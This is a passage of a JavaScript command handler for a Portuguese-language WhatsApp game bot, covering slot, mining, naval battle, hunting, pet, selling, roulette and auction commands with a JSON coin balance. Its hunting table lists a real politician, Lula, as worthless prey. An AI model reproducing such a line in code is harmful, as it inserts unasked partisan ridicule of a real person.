resultado = '💥 𝐌𝐄𝐆𝐀 𝐉𝐀𝐂𝐊𝐏𝐎𝐓!';
}
else if (a === b && b === c) {
multiplicador = 8;
resultado = '🏆 𝐉𝐀𝐂𝐊𝐏𝐎𝐓!';
}
else if (a === b || b === c || a === c) {
multiplicador = 2;
resultado = '🎉 𝐏𝐑𝐄̂𝐌𝐈𝐎!';
}
else if (Math.random() < 0.10) {
multiplicador = 1;
resultado = '🤑 𝐀𝐏𝐎𝐒𝐓𝐀 𝐃𝐄𝐕𝐎𝐋𝐕𝐈𝐃𝐀!';
}

if (multiplicador > 0) {
premio = aposta * multiplicador;
banco[user].saldo += premio;
} else {
premio = aposta;
banco[user].saldo -= aposta;
resultado = '💀 𝐕𝐎𝐂𝐄̂ 𝐏𝐄𝐑𝐃𝐄𝐔!';
}

fs.writeFileSync(bancoPath, JSON.stringify(banco, null, 2));

const sorte = Math.floor(Math.random() * 100) + 1;

reply(`╭━━━〔 🐯 𝐅𝐎𝐑𝐓𝐔𝐍𝐄 𝐓𝐈𝐆𝐄𝐑 〕━━━⬣
┃
┃        ${a} │ ${b} │ ${c}
┃
┣━━━〔 📊 𝐑𝐄𝐒𝐔𝐋𝐓𝐀𝐃𝐎 〕━━━⬣
┃ ${resultado}
┃ 💸 Aposta: *$${aposta}*
${
multiplicador > 0
? `┃ ✖️ Multiplicador: *${multiplicador}x*
┃ 💰 Ganhou: *+$${premio}*`
: `┃ 📉 Perdeu: *-$${aposta}*`
}
┃ 🏦 Saldo: *$${banco[user].saldo}*
┃
┣━━━〔 👤 𝐉𝐎𝐆𝐀𝐃𝐎𝐑 〕━━━⬣
┃ 👤 ${pushname}
┃ 🍀 Sorte: *${sorte}%*
┃
╰━━━〔 ❤️‍🔥 𝐙𝐘𝐑𝐎𝐍-𝐌𝐃 〕━━━⬣`);

} catch (e) {
console.log(e);
reply(`╭━━━〔 ❌ 𝐅𝐎𝐑𝐓𝐔𝐍𝐄 𝐓𝐈𝐆𝐄𝐑 〕━━━⬣
┃ Ocorreu um erro.
┃ Tente novamente.
╰━━━〔 ❤️‍🔥 𝐙𝐘𝐑𝐎𝐍-𝐌𝐃 〕━━━⬣`);
}
}
break;

case 'mineracao':
case 'minerar': {
try {

if (!fs.existsSync(bancoPath)) {
fs.writeFileSync(bancoPath, '{}');
}

let banco = JSON.parse(fs.readFileSync(bancoPath));
const user = getUserBancoId(info, sender, isGroup);

if (!banco[user]) {
banco[user] = {
saldo: 0,
xp: 0,
inventario: {},
mineracaoPendente: null
};
}

if (!banco[user].inventario) banco[user].inventario = {};
if (!banco[user].mineracaoPendente) banco[user].mineracaoPendente = null;

const minerios = [
{ nome: "🪨 Pedra", valor: 20, chance: 35 },
{ nome: "⛓️ Ferro", valor: 60, chance: 25 },
{ nome: "🟫 Cobre", valor: 80, chance: 20 },
{ nome: "🥈 Prata", valor: 150, chance: 12 },
{ nome: "🥇 Ouro", valor: 250, chance: 8 },
{ nome: "💎 Diamante", valor: 600, chance: 3 },
{ nome: "🟣 Ametista", valor: 800, chance: 2 },
{ nome: "🔷 Cristal Azul", valor: 1000, chance: 1 },
{ nome: "🧱 Obsidiana", valor: 1200, chance: 0.8 },
{ nome: "🌟 Minério Estelar", valor: 2500, chance: 0.2 },
{ nome: "👑 Núcleo Lendário", valor: 5000, chance: 0.05 }
];

function sortearMinerio(minerios) {
let totalChance = minerios.reduce((acc, item) => acc + item.chance, 0);
let random = Math.random() * totalChance;

for (let item of minerios) {
random -= item.chance;
if (random <= 0) return item;
}
}

await reply(`╭━━━〔 ⛏️ 𝐌𝐈𝐍𝐄𝐑𝐀𝐂̧𝐀̃𝐎 𝐙𝐘𝐑𝐎𝐍 〕━━━⬣
┃ 🪨 Você entrou nas minas do Kyara...
┃ ⛏️ Preparando a picareta...
┃ 🔦 Iluminando os túneis escuros...
┃ ⚠️ Cuidado com desabamentos!
┃
╰━━━〔 💎 𝐙𝐘𝐑𝐎𝐍 𝐌𝐈𝐍𝐄 〕━━━⬣`);

await new Promise(resolve => setTimeout(resolve, 2000));

await reply(`╭━━━〔 🕳️ 𝐌𝐈𝐍𝐀 𝐏𝐑𝐎𝐅𝐔𝐍𝐃𝐀 〕━━━⬣
┃ ⛏️ Você começou a quebrar as rochas...
┃ 💥 Fragmentos caem pelo chão...
┃ 💎 Algo brilhou dentro da parede...
┃ 🔎 Analisando minério encontrado...
┃
╰━━━〔 ⛏️ 𝐌𝐈𝐍𝐄𝐑𝐀𝐂̧𝐀̃𝐎 𝐄𝐌 𝐀𝐍𝐃𝐀𝐌𝐄𝐍𝐓𝐎 〕━━━⬣`);

await new Promise(resolve => setTimeout(resolve, 2000));

await reply(`╭━━━〔 💎 𝐑𝐄𝐂𝐔𝐑𝐒𝐎𝐒 𝐄𝐍𝐂𝐎𝐍𝐓𝐑𝐀𝐃𝐎𝐒 〕━━━⬣
┃ 📦 Separando os recursos minerados...
┃ ⚖️ Calculando valor da mineração...
┃ ✨ Convertendo esforço em XP...
┃ 🏦 Preparando relatório do Kyara Bank...
┃
╰━━━〔 ❤️‍🔥 𝐙𝐘𝐑𝐎𝐍-𝐌𝐃 〕━━━⬣`);

await new Promise(resolve => setTimeout(resolve, 2000));

const quantidade = Math.floor(Math.random() * 4) + 2;
let total = 0;
let coletados = {};

for (let i = 0; i < quantidade; i++) {
let item = sortearMinerio(minerios);

if (!coletados[item.nome]) {
coletados[item.nome] = {
qtd: 0,
valor: item.valor
};
}

coletados[item.nome].qtd++;
total += item.valor;
}

const xp = Math.floor(total / 5);
const energia = Math.floor(Math.random() * 20) + 10;
const sorteDia = Math.floor(Math.random() * 100) + 1;

banco[user].xp += xp;

banco[user].mineracaoPendente = {
itens: coletados,
total: total,
xp: xp
};

fs.writeFileSync(bancoPath, JSON.stringify(banco, null, 2));

let lista = '';

for (const item in coletados) {
const dados = coletados[item];
lista += `⌬ ${item} (${dados.qtd}x) • *$${dados.valor * dados.qtd}*\n`;
}

const msgFinal = `╭━━━〔 ⛏️ 𝐑𝐄𝐒𝐔𝐋𝐓𝐀𝐃𝐎 𝐙𝐘𝐑𝐎𝐍 〕━━━⬣
${lista.trim()}
┃
┣━━━〔 💎 𝐌𝐈𝐍𝐄𝐑𝐀𝐂̧𝐀̃𝐎 〕━━━⬣
┃ 💰 Valor Total: *$${total}*
┃ ✨ Experiência: *+${xp} XP*
┃ ⚡ Energia Gasta: *-${energia}*
┃ ⛏️ Minérios Coletados: *${quantidade}*
┃
┣━━━〔 👤 𝐌𝐈𝐍𝐄𝐑𝐀𝐃𝐎𝐑 〕━━━⬣
┃ 👤 Nome: *${pushname}*
┃ 🏅 Classe: *${classificacao}*
┃ 🌟 Sorte do Dia: *${sorteDia}%*
┃
┣━━━〔 📦 𝐎𝐏𝐂̧𝐎̃𝐄𝐒 〕━━━⬣
┃ 📦 Guardar minérios:
┃ ${prefix}guardarminerio
┃
┃ 💰 Vender minérios:
┃ ${prefix}venderminerio
┃
╰━━━〔 ❤️‍🔥 𝐙𝐘𝐑𝐎𝐍 𝐌𝐈𝐍𝐈𝐍𝐆 〕━━━⬣`;

reply(msgFinal);

} catch (e) {
console.log(e);
reply('Erro ao minerar.');
}
}
break;

case 'guardarminerio': {
try {

if (!fs.existsSync(bancoPath)) {
fs.writeFileSync(bancoPath, '{}');
}

let banco = JSON.parse(fs.readFileSync(bancoPath));
const user = getUserBancoId(info, sender, isGroup);

if (!banco[user] || !banco[user].mineracaoPendente) {
return reply('❌ Você não tem mineração pendente para guardar.');
}

if (!banco[user].inventario) banco[user].inventario = {};

const pendente = banco[user].mineracaoPendente.itens;

for (const item in pendente) {
if (!banco[user].inventario[item]) {
banco[user].inventario[item] = {
qtd: 0,
valor: pendente[item].valor
};
}

banco[user].inventario[item].qtd += pendente[item].qtd;
}

banco[user].mineracaoPendente = null;

fs.writeFileSync(bancoPath, JSON.stringify(banco, null, 2));

reply(`╭━━━〔 📦 𝐌𝐈𝐍𝐄́𝐑𝐈𝐎𝐒 𝐆𝐔𝐀𝐑𝐃𝐀𝐃𝐎𝐒 〕━━━⬣
┃ ✅ Os minérios foram armazenados com sucesso.
┃ 🎒 Inventário atualizado.
┃
┣━━━〔 💎 𝐑𝐄𝐂𝐔𝐑𝐒𝐎𝐒 〕━━━⬣
┃ ⛏️ Todos os minérios coletados
┃ foram enviados para seu inventário.
┃
┣━━━〔 📌 𝐀𝐂𝐄𝐒𝐒𝐀𝐑 〕━━━⬣
┃ 🎒 Ver inventário:
┃ ${prefix}inventario
┃
╰━━━〔 ❤️‍🔥 𝐙𝐘𝐑𝐎𝐍 𝐌𝐈𝐍𝐈𝐍𝐆 〕━━━⬣`);

} catch (e) {
console.log(e);
reply('Erro ao guardar minérios.');
}
}
break;

case 'venderminerio': {
try {

if (!fs.existsSync(bancoPath)) {
fs.writeFileSync(bancoPath, '{}');
}

let banco = JSON.parse(fs.readFileSync(bancoPath));
const user = getUserBancoId(info, sender, isGroup);

if (!banco[user] || !banco[user].mineracaoPendente) {
return reply('❌ Você não tem mineração pendente para vender.');
}

const pendente = banco[user].mineracaoPendente;
const total = pendente.total;

banco[user].saldo += total;
banco[user].mineracaoPendente = null;

fs.writeFileSync(bancoPath, JSON.stringify(banco, null, 2));

reply(`╭━━━〔 💰 𝐌𝐈𝐍𝐄́𝐑𝐈𝐎𝐒 𝐕𝐄𝐍𝐃𝐈𝐃𝐎𝐒 〕━━━⬣
┃ ✅ Todos os minérios foram vendidos.
┃
┣━━━〔 🏦 𝐙𝐘𝐑𝐎𝐍 𝐁𝐀𝐍𝐊 〕━━━⬣
┃ 💰 Valor Recebido: *+$${total}*
┃ 🏦 Saldo Atual: *$${banco[user].saldo}*
┃
┣━━━〔 📈 𝐓𝐑𝐀𝐍𝐒𝐀𝐂̧𝐀̃𝐎 〕━━━⬣
┃ ⛏️ Recursos convertidos em dinheiro.
┃ ✅ Operação concluída com sucesso.
┃
╰━━━〔 ❤️‍🔥 𝐙𝐘𝐑𝐎𝐍 𝐌𝐈𝐍𝐈𝐍𝐆 〕━━━⬣`);

} catch (e) {
console.log(e);
reply('Erro ao vender minérios.');
}
}
break;

case 'inventario':
case 'inv': {
try {

if (!fs.existsSync(bancoPath)) {
fs.writeFileSync(bancoPath, '{}');
}

let banco = JSON.parse(fs.readFileSync(bancoPath));
const user = getUserBancoId(info, sender, isGroup);

if (!banco[user]) {
banco[user] = {
saldo: 0,
xp: 0,
inventario: {},
mineracaoPendente: null
};
}

if (!banco[user].inventario) banco[user].inventario = {};

let listaInv = '';

for (const item in banco[user].inventario) {
const dados = banco[user].inventario[item];

const qtd = typeof dados === 'number' ? dados : dados.qtd || 1;
const valor = typeof dados === 'number' ? 0 : dados.valor || 0;

const itemLoja = lojaItems.find(i => i.item === item);
const nomeItem = itemLoja ? itemLoja.nome : item;
const precoItem = itemLoja ? itemLoja.preco : valor;

listaInv += `⌬ ${nomeItem} (${qtd}x) • *$${precoItem * qtd}*\n`;
}

if (!listaInv) {
listaInv = `┃ 📦 Inventário vazio.`;
}

reply(`╭━━━〔 🎒 𝐈𝐍𝐕𝐄𝐍𝐓𝐀́𝐑𝐈𝐎 𝐙𝐘𝐑𝐎𝐍 〕━━━⬣
┃ 👤 Usuário: ${pushname}
┃
┣━━━〔 📦 𝐈𝐓𝐄𝐍𝐒 𝐀𝐑𝐌𝐀𝐙𝐄𝐍𝐀𝐃𝐎𝐒 〕━━━⬣
${listaInv.trim()}
┃
┣━━━〔 📊 𝐒𝐈𝐒𝐓𝐄𝐌𝐀 〕━━━⬣
┃ 🎣 Itens de pesca
┃ ⛏️ Recursos minerados
┃ 🏹 Itens de caça
┃ 🛒 Itens comprados
┃
╰━━━〔 ❤️‍🔥 𝐙𝐘𝐑𝐎𝐍 𝐒𝐓𝐎𝐑𝐀𝐆𝐄 〕━━━⬣`);

fs.writeFileSync(bancoPath, JSON.stringify(banco, null, 2));

} catch (e) {
console.log(e);
reply('Erro ao abrir inventário.');
}
}
break;

case 'batalhanaval':
case 'naval': {
try {

if (!fs.existsSync(bancoPath)) {
fs.writeFileSync(bancoPath, '{}');
}

let banco = JSON.parse(fs.readFileSync(bancoPath));
const user = getUserBancoId(info, sender, isGroup);

if (!banco[user]) {
banco[user] = {
saldo: 0,
xp: 0,
inventario: {}
};
}

const tiros = Math.floor(Math.random() * 5) + 3;
let acertos = 0;
let recompensa = 0;
let resultadoTiros = '';

const alvos = [
{ nome: '🌊 Água', valor: 0, chance: 45 },
{ nome: '🚤 Barco Pequeno', valor: 150, chance: 25 },
{ nome: '⛵ Veleiro', valor: 250, chance: 15 },
{ nome: '🚢 Navio Cargueiro', valor: 500, chance: 8 },
{ nome: '🛳️ Cruzeiro', valor: 800, chance: 4 },
{ nome: '⚓ Porta-Aviões', valor: 1500, chance: 2 },
{ nome: '🏴‍☠️ Navio Pirata', valor: 3000, chance: 1 }
];

function sortearAlvo(lista) {
let totalChance = lista.reduce((acc, item) => acc + item.chance, 0);
let random = Math.random() * totalChance;

for (let item of lista) {
random -= item.chance;
if (random <= 0) return item;
}
}

await reply(`╭━━━〔 🚢 𝐁𝐀𝐓𝐀𝐋𝐇𝐀 𝐍𝐀𝐕𝐀𝐋 𝐙𝐘𝐑𝐎𝐍 〕━━━⬣
┃ 🌊 O oceano de combate foi aberto...
┃ 🎯 Preparando os canhões...
┃ 🧭 Procurando embarcações inimigas...
┃ ⚓ Frota em posição de ataque...
┃
╰━━━〔 🚀 𝐙𝐘𝐑𝐎𝐍 𝐅𝐋𝐄𝐄𝐓 〕━━━⬣`);

await new Promise(resolve => setTimeout(resolve, 2000));

await reply(`╭━━━〔 💣 𝐀𝐓𝐀𝐐𝐔𝐄 𝐈𝐍𝐈𝐂𝐈𝐀𝐃𝐎 〕━━━⬣
┃ 🚢 Seu navio entrou em posição.
┃ 🔥 Canhões carregados.
┃ 🎯 Travando mira no alvo.
┃ ⚠️ Disparando contra a embarcação inimiga...
┃
╰━━━〔 ⚓ 𝐙𝐘𝐑𝐎𝐍 𝐖𝐀𝐑 𝐒𝐘𝐒𝐓𝐄𝐌 〕━━━⬣`);

await new Promise(resolve => setTimeout(resolve, 2000));

for (let i = 1; i <= tiros; i++) {
let alvo = sortearAlvo(alvos);

if (alvo.valor > 0) {
acertos++;
recompensa += alvo.valor;
resultadoTiros += `⌬ 🎯 Tiro ${i}: ${alvo.nome} • *+$${alvo.valor}*\n`;
} else {
resultadoTiros += `⌬ 💦 Tiro ${i}: ${alvo.nome} • *Errou*\n`;
}
}

const xp = Math.floor(recompensa / 5);
const sorteDia = Math.floor(Math.random() * 100) + 1;

if (!banco[user].batalhaNaval) {
banco[user].batalhaNaval = {
partidas: 0,
vitorias: 0,
derrotas: 0,
recompensaTotal: 0
};
}

banco[user].batalhaNaval.partidas += 1;
banco[user].batalhaNaval.recompensaTotal += recompensa;

if (recompensa > 0) {
banco[user].batalhaNaval.vitorias += 1;
} else {
banco[user].batalhaNaval.derrotas += 1;
}

banco[user].saldo += recompensa;
banco[user].xp += xp;

fs.writeFileSync(bancoPath, JSON.stringify(banco, null, 2));

const xpTotal = banco[user].xp;

let patente = '⚓ Marinheiro';

if (xpTotal >= 1000000) patente = '👑 Almirante Supremo';
else if (xpTotal >= 500000) patente = '🛳️ Almirante';
else if (xpTotal >= 250000) patente = '🚢 Vice-Almirante';
else if (xpTotal >= 100000) patente = '⛴️ Contra-Almirante';
else if (xpTotal >= 50000) patente = '🛥️ Capitão';
else if (xpTotal >= 20000) patente = '⚓ Comandante';
else if (xpTotal >= 10000) patente = '🧭 Tenente';
else if (xpTotal >= 5000) patente = '🎖️ Sargento';
else if (xpTotal >= 1000) patente = '🚤 Marinheiro Veterano';

const msg = `╭━━━〔 🚢 𝐑𝐄𝐒𝐔𝐋𝐓𝐀𝐃𝐎 𝐍𝐀𝐕𝐀𝐋 〕━━━⬣
${resultadoTiros.trim()}
┃
┣━━━〔 ⚔️ 𝐂𝐎𝐌𝐁𝐀𝐓𝐄 〕━━━⬣
┃ 🎯 Tiros Disparados: *${tiros}*
┃ 💥 Acertos Confirmados: *${acertos}*
┃ 💰 Recompensa: *+$${recompensa}*
┃ 🏦 Saldo Atual: *$${banco[user].saldo}*
┃ ✨ Experiência: *+${xp} XP*
┃
┣━━━〔 👤 𝐂𝐎𝐌𝐀𝐍𝐃𝐀𝐍𝐓𝐄 〕━━━⬣
┃ 👤 Nome: *${pushname}*
┃ 🏅 Patente: *${patente}*
┃ 🌟 Sorte do Dia: *${sorteDia}%*
┃
┣━━━〔 🚀 𝐅𝐑𝐎𝐓𝐀 𝐙𝐘𝐑𝐎𝐍 〕━━━⬣
┃ ⚓ Missão concluída.
┃ 🎖️ Recompensa creditada.
┃
╰━━━〔 ❤️‍🔥 𝐙𝐘𝐑𝐎𝐍 𝐖𝐀𝐑 𝐒𝐘𝐒𝐓𝐄𝐌 〕━━━⬣`;

reply(msg);

} catch (e) {
console.log(e);
reply('Erro na batalha naval.');
}
}
break;

case 'caca':
case 'caçar':
case 'cacar': {
try {

if (!fs.existsSync(bancoPath)) {
fs.writeFileSync(bancoPath, '{}');
}

let banco = carregarBanco();

const user = getUserBancoId(info, sender, isGroup);
console.log("CACA USER:", user);

verificarConta(banco, user);

if (!banco[user]) {
banco[user] = {
saldo: 0,
xp: 0,
inventario: {},
pets: {},
cacaPendente: null
};
}

if (!banco[user].inventario) banco[user].inventario = {};
if (!banco[user].pets) banco[user].pets = {};
if (!banco[user].cacaPendente) banco[user].cacaPendente = null;

const animais = [
{ nome: "🐇 Coelho", valor: 60, chance: 35 },
{ nome: "🦆 Pato Selvagem", valor: 80, chance: 30 },
{ nome: "🦊 Raposa", valor: 150, chance: 20 },
{ nome: "🐗 Javali", valor: 250, chance: 10 },
{ nome: "🦌 Veado", valor: 400, chance: 10 },
{ nome: "🐺 Lobo", valor: 600, chance: 8 },
{ nome: "🐻 Urso", valor: 1000, chance: 10 },
{ nome: "🐉 Dragão da Floresta", valor: 5463, chance: 4 },
{ nome: "🦕 Monstro do Lago ness", valor: 6789, chance: 3 },
{ nome: "🐲 Dragão de komodo", valor: 7945, chance: 2 },
{ nome: "🐦‍🔥 Fênix", valor: 8390, chance: 1 },
{ nome: "🦑 Luiz Inácio Lula da Silva", valor: 0, chance: 50 },
{ nome: "☢️ Bomba radioativa", valor: 10000, chance: 0.1 },
{ nome: "🐿️ Esquilo", valor: 45, chance: 40 },
{ nome: "🦔 Ouriço", valor: 70, chance: 30 },
{ nome: "🦝 Guaxinim", valor: 120, chance: 22 },
{ nome: "🦨 Gambá", valor: 150, chance: 18 },
{ nome: "🦡 Texugo", valor: 220, chance: 15 },
{ nome: "🐒 Macaco", valor: 300, chance: 12 },
{ nome: "🦜 Arara", valor: 420, chance: 10 },
{ nome: "🦅 Águia", valor: 650, chance: 8 },
{ nome: "🐅 Tigre", valor: 950, chance: 6 },
{ nome: "🦁 Leão", valor: 1200, chance: 5 },
{ nome: "🦍 Gorila", valor: 1600, chance: 4 },
{ nome: "🦛 Hipopótamo", valor: 2100, chance: 3.5 },
{ nome: "🦏 Rinoceronte", valor: 2800, chance: 3 },
{ nome: "🐘 Elefante", valor: 3500, chance: 2.5 },
{ nome: "🦖 Tiranossauro Rex", valor: 7000, chance: 1.5 },
{ nome: "🦄 Unicórnio", valor: 8500, chance: 1 },
{ nome: "👹 Yeti", valor: 9500, chance: 0.8 },
{ nome: "🐉 Dragão Ancestral", valor: 12000, chance: 0.5 },
{ nome: "🌌 Guardião Celestial", valor: 18000, chance: 0.2 },
{ nome: "👽 Alienígena Perdido", valor: 25000, chance: 0.05 }
];

function sortearAnimal(lista) {
let totalChance = lista.reduce((acc, item) => acc + item.chance, 0);
let random = Math.random() * totalChance;

for (let item of lista) {
random -= item.chance;
if (random <= 0) return item;
}
return lista[0];
}

await reply(`╭━━━〔 🏹 𝐂𝐀𝐂̧𝐀 𝐙𝐘𝐑𝐎𝐍 〕━━━⬣
┃ 🌲 Você entrou na floresta selvagem...
┃ 🏹 Preparando o arco de caça...
┃ 👣 Procurando rastros de animais...
┃ 🍃 O ambiente está silencioso...
┃
╰━━━〔 🌿 𝐙𝐘𝐑𝐎𝐍 𝐇𝐔𝐍𝐓𝐈𝐍𝐆 〕━━━⬣`);

await new Promise(resolve => setTimeout(resolve, 2000));

await reply(`╭━━━〔 🌲 𝐅𝐋𝐎𝐑𝐄𝐒𝐓𝐀 𝐏𝐑𝐎𝐅𝐔𝐍𝐃𝐀 〕━━━⬣
┃ 👀 Algo se move entre as árvores...
┃ 🍃 O vento mudou de direção...
┃ 🐾 Rastros foram encontrados...
┃ ⚠️ Você prepara o disparo...
┃
╰━━━〔 🎯 𝐀𝐋𝐕𝐎 𝐄𝐌 𝐕𝐈𝐒𝐓𝐀 〕━━━⬣`);

await new Promise(resolve => setTimeout(resolve, 2000));

const tentativas = Math.floor(Math.random() * 4) + 2;
let total = 0;
let capturas = {};

for (let i = 0; i < tentativas; i++) {
let animal = sortearAnimal(animais);

if (!capturas[animal.nome]) {
capturas[animal.nome] = {
qtd: 0,
valor: animal.valor
};
}

capturas[animal.nome].qtd++;
total += animal.valor;
}

const xp = Math.floor(total / 5);
const energia = Math.floor(Math.random() * 20) + 10;
const sorteDia = Math.floor(Math.random() * 100) + 1;

banco[user].xp += xp;

banco[user].cacaPendente = {
itens: capturas,
total: total,
xp: xp
};

fs.writeFileSync(bancoPath, JSON.stringify(banco, null, 2));

let lista = '';

for (const item in capturas) {
const dados = capturas[item];
lista += `⌬ ${item} (${dados.qtd}x) • *$${dados.valor * dados.qtd}*\n`;
}

let classificacao = "Iniciante";

if (banco[user].xp >= 999999999) classificacao = "Lendário";
else if (banco[user].xp >= 1000000) classificacao = "Mestre";
else if (banco[user].xp >= 100000) classificacao = "Veterano";
else if (banco[user].xp >= 10000) classificacao = "Caçador";
else if (banco[user].xp >= 1000) classificacao = "Aprendiz";

const msgFinal = `╭━━━〔 🏹 𝐑𝐄𝐒𝐔𝐋𝐓𝐀𝐃𝐎 𝐙𝐘𝐑𝐎𝐍 〕━━━⬣
${lista.trim()}
┃
┣━━━〔 🎯 𝐂𝐀𝐂̧𝐀 〕━━━⬣
┃ 💰 Valor Total: *$${total}*
┃ ✨ Experiência: *+${xp} XP*
┃ ⚡ Energia Gasta: *-${energia}*
┃ 🐾 Animais Encontrados: *${tentativas}*
┃
┣━━━〔 👤 𝐂𝐀𝐂̧𝐀𝐃𝐎𝐑 〕━━━⬣
┃ 🏹 Nome: *${pushname}*
┃ 🏅 Classe: *${classificacao}*
┃ 🌟 Sorte do Dia: *${sorteDia}%*
┃
┣━━━〔 🐾 𝐎𝐏𝐂̧𝐎̃𝐄𝐒 〕━━━⬣
┃ 🐾 Guardar animais:
┃ ${prefix}guardaranimal
┃
┃ 💰 Vender animais:
┃ ${prefix}venderanimal
┃
╰━━━〔 ❤️‍🔥 𝐙𝐘𝐑𝐎𝐍 𝐇𝐔𝐍𝐓𝐈𝐍𝐆 〕━━━⬣`;

reply(msgFinal);

} catch (e) {
console.log(e);
reply('Erro ao caçar.');
}
}
break;

case 'pets':
case 'meuspets': {
console.log("✅ ENTROU NO PETS");
try {

let banco = carregarBanco();

const user = getUserBancoId(info, sender, isGroup);
console.log("GUARDAR USER:", user);

verificarConta(banco, user);

console.log("PENDENTE:", banco[user]?.cacaPendente);

if (!banco[user].cacaPendente || !banco[user].cacaPendente.itens) {
return reply(`❌ Você não tem nenhum animal pendente.\n\nUse *${prefix}cacar* primeiro.`);
}

const capturas = banco[user].cacaPendente.itens;

let lista = '';

for (const animal in capturas) {
const dados = capturas[animal];

if (!banco[user].pets[animal]) {
banco[user].pets[animal] = {
qtd: 0,
valor: dados.valor || 0
};
}

banco[user].pets[animal].qtd += dados.qtd || 1;
banco[user].pets[animal].valor = dados.valor || banco[user].pets[animal].valor || 0;

lista += `⌬ 🐾 ${animal} (+${dados.qtd || 1}x)\n`;
}

banco[user].cacaPendente = null;

salvarBanco(banco);

reply(`╭━━━〔 🐾 𝐏𝐄𝐓𝐒 𝐀𝐃𝐈𝐂𝐈𝐎𝐍𝐀𝐃𝐎𝐒 〕━━━⬣
${lista.trim()}
┃
┣━━━〔 👤 𝐏𝐑𝐎𝐏𝐑𝐈𝐄𝐓𝐀́𝐑𝐈𝐎 〕━━━⬣
┃ 🏹 Dono: *${pushname}*
┃
┣━━━〔 📌 𝐀𝐂𝐄𝐒𝐒𝐀𝐑 〕━━━⬣
┃ 🐾 Ver coleção:
┃ ${prefix}pets
┃
╰━━━〔 ❤️‍🔥 𝐙𝐘𝐑𝐎𝐍 𝐏𝐄𝐓 𝐒𝐘𝐒𝐓𝐄𝐌 〕━━━⬣`);

} catch (e) {
console.log(e);
reply('❌ Erro ao guardar animal.');
}
}
break;

case 'venderitem': {
try {

let banco = carregarBanco();
const user = getUserBancoId(info, sender, isGroup);

verificarConta(banco, user);

if (!q) return reply(`Uso:\n${prefix}venderitem nome quantidade`);

const args = q.split(' ');
const qtd = parseInt(args[args.length - 1]);

if (isNaN(qtd) || qtd < 1)
return reply('Quantidade inválida.');

const item = args.slice(0, -1).join(' ');

if (!banco[user].inventario[item])
return reply('Você não possui esse item.');

if (banco[user].inventario[item].qtd < qtd)
return reply('Você não possui essa quantidade.');

const valorUnit = banco[user].inventario[item].valor || 0;
const total = valorUnit * qtd;

banco[user].inventario[item].qtd -= qtd;
banco[user].saldo += total;

if (banco[user].inventario[item].qtd <= 0)
delete banco[user].inventario[item];

salvarBanco(banco);

reply(`💸 Item vendido!

📦 Item: ${item}
🔢 Quantidade: ${qtd}
💰 Recebido: $${total}`);

} catch (e) {
console.log(e);
reply('Erro ao vender item.');
}
}
break;

case 'venderanimal':
case 'venderpet': {
try {

let banco = carregarBanco();
const user = getUserBancoId(info, sender, isGroup);

verificarConta(banco, user);

if (!banco[user].cacaPendente || !banco[user].cacaPendente.itens) {
return reply(`❌ Você não tem nenhum animal pendente.\n\nUse *${prefix}cacar* primeiro.`);
}

const capturas = banco[user].cacaPendente.itens;
const total = banco[user].cacaPendente.total || 0;

banco[user].saldo += total;
banco[user].cacaPendente = null;

salvarBanco(banco);

reply(`╭━━━〔 💰 𝐌𝐄𝐑𝐂𝐀𝐃𝐎 𝐃𝐄 𝐀𝐍𝐈𝐌𝐀𝐈𝐒 〕━━━⬣
┃ ✅ Todos os animais foram vendidos.
┃
┣━━━〔 🏦 𝐙𝐘𝐑𝐎𝐍 𝐁𝐀𝐍𝐊 〕━━━⬣
┃ 💰 Valor Recebido: *+$${total}*
┃ 🏦 Saldo Atual: *$${banco[user].saldo}*
┃
┣━━━〔 📊 𝐓𝐑𝐀𝐍𝐒𝐀𝐂̧𝐀̃𝐎 〕━━━⬣
┃ 🐾 Animais convertidos em Kyara Cash.
┃ ✅ Operação concluída com sucesso.
┃
╰━━━〔 ❤️‍🔥 𝐙𝐘𝐑𝐎𝐍 𝐇𝐔𝐍𝐓𝐈𝐍𝐆 〕━━━⬣`);

} catch (e) {
console.log(e);
reply('❌ Erro ao vender animal.');
}
}
break;

case 'roleta': {
try {
if (!q) return reply(`_Exemplo: ${prefix + command} teste, teste1, teste2_`);

await conn.sendMessage(from, { react: { text: '🎰', key: info.key } });

const opcoes = q.split(',').map(v => v.trim()).filter(Boolean);

if (opcoes.length < 2) return reply('_Mínimo de 2 opções._');

const { data } = await axios.get('https://zone.api.br/api/canvas/roleta', {
params: {
text: opcoes.join(',')
}
});

if (!data?.status || !data?.result?.download) {
throw new Error('API falhou');
}

await conn.sendMessage(from, {
video: { url: data.result.download },
ptv: true,
mimetype: 'video/mp4'
}, { quoted: selo });

await conn.sendMessage(from, { react: { text: '✅', key: info.key } });

} catch (e) {
console.error('[ERRO ROLETA]', e?.response?.data || e.message);

await conn.sendMessage(from, { react: { text: '❌', key: info.key } });

reply('_Erro ao gerar a roleta._');
}
}
break;

case 'leilao': {
try {

const path = './database/leiloes.json';

if (!fs.existsSync('./database')) fs.mkdirSync('./database');
if (!fs.existsSync(path)) fs.writeFileSync(path, '{}');

const leiloes = JSON.parse(fs.readFileSync(path));
const banco = carregarBanco();

const sub = args[0]?.toLowerCase();
const userId = jidNormalizedUser(sender);

if (!sub) {
return reply(`╭━━━〔 🏦 𝐋𝐄𝐈𝐋𝐀̃𝐎 𝐙𝐘𝐑𝐎𝐍 〕━━━⬣
┃ 📦 Criar leilão:
┃ ${prefix}leilao criar item valor
┃
┃ 📋 Listar leilão:
┃ ${prefix}leilao listar
┃
┃ 💰 Dar lance:
┃ ${prefix}leilao lance valor
┃
┃ ❌ Cancelar:
┃ ${prefix}leilao cancelar
┃
┃ 🏆 Finalizar:
┃ ${prefix}leilao finalizar
┃
╰━━━〔 ❤️‍🔥 𝐙𝐘𝐑𝐎𝐍 𝐀𝐔𝐂𝐓𝐈𝐎𝐍 〕━━━⬣`);
}

if (sub === 'criar') {

if (leiloes[from]) {
return reply(`╭━━━〔 ❌ 𝐋𝐄𝐈𝐋𝐀̃𝐎 𝐀𝐓𝐈𝐕𝐎 〕━━━⬣
┃ Já existe um leilão ativo neste grupo.
┃ Finalize ou cancele antes de criar outro.
╰━━━〔 🏦 𝐙𝐘𝐑𝐎𝐍 𝐀𝐔𝐂𝐓𝐈𝐎𝐍 〕━━━⬣`);
}

const item = args[1]?.toLowerCase();
const valor = Number(args[2]);

if (!item || !valor) {
return reply(`╭━━━〔 📦 𝐂𝐑𝐈𝐀𝐑 𝐋𝐄𝐈𝐋𝐀̃𝐎 〕━━━⬣
┃ Use:
┃ ${prefix}leilao criar pcgamer 50000
╰━━━〔 💰 𝐙𝐘𝐑𝐎𝐍 𝐌𝐀𝐑𝐊𝐄𝐓 〕━━━⬣`);
}

if (!banco[userId]?.inventario?.[item]) {
